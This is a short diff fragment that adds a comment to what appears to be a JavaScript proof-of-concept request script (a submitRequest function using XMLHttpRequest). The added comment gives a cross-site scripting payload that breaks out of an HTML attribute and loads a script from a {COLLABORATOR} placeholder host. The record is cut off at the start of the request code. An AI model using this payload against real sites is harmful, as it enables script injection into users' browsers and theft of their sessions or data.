@@ -1,3 +1,5 @@
+/Firstly, made a XSS, for example: "><script src=https://{COLLABORATOR}/test.js></script>
+
 function submitRequest()
       {
         var xhr = new XMLHttpRequest();
